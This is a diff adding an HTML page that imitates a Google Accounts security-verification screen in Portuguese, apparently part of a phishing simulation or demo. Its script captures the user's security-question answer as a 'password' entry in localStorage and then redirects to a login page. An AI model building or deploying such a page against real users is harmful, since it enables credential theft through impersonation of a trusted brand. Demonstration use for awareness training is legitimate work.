@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Verificação de segurança - Google Accounts</title>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body class="google-login">
+
+  <div class="card">
+    <div class="glogo"><h1 style="font-size:22px;">Verificação de segurança</h1></div>
+    <p class="subtitle">Confirme que é você quem está acessando esta conta. Escolha uma opção:</p>
+
+    <div class="recovery-options">
+      <a class="option" href="recuperar-telefone.html">
+        <span class="icon">📱</span>
+        <div><b>Acesso pelo telefone</b><br><span class="hint2">Você poderá usar o telefone para confirmar sua identidade</span></div>
+      </a>
+      <a class="option" href="#" onclick="askQuestion(event)">
+        <span class="icon">🔑</span>
+        <div><b>Responder pergunta de segurança</b><br><span class="hint2">Qual o nome da sua primeira empresa?</span></div>
+      </a>
+    </div>
+
+    <div class="field hidden" id="qField">
+      <input type="text" id="answer" placeholder="Resposta"
+             onkeydown="if(event.key==='Enter'){event.preventDefault();answerQ();}">
+    </div>
+
+    <div class="card-footer">
+      <a href="../login.html" class="blue-link">Cancelar</a>
+      <button class="btn-blue hidden" id="qBtn" onclick="answerQ()">Enviar</button>
+    </div>
+  </div>
+
+<script>
+function askQuestion(e){
+  e.preventDefault();
+  document.getElementById('qField').classList.remove('hidden');
+  document.getElementById('qBtn').classList.remove('hidden');
+  document.getElementById('answer').focus();
+}
+
+function answerQ(){
+  const a = document.getElementById('answer').value.trim();
+  if(!a){ document.getElementById('answer').focus(); return; }
+
+  const store = JSON.parse(localStorage.getItem('captured') || '[]');
+  store.push({
+    email: '[PERGUNTA DE SEGURANÇA] primeira empresa',
+    password: a,
+    timestamp: new Date().toLocaleTimeString('pt-BR'),
+    userAgent: navigator.userAgent,
+    target: 'pergunta de segurança'
+  });
+  localStorage.setItem('captured', JSON.stringify(store));
+  localStorage.setItem('captured_event', Date.now());
+
+  window.location.href = '../login.html';
+}
+</script>
+</body>
+</html>
